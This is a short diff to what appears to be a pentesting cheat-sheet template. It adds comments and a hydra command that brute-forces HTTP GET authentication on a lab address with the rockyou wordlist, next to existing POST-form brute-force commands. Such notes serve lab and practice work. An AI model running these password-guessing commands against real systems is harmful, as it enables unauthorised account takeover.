@@ -46,8 +46,12 @@ platform:platform
 
 ## hydra
 ```bash
+# POST 
 hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+
+# GET
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.211.201 http-get /
 ```
 
 ## wappalyzer
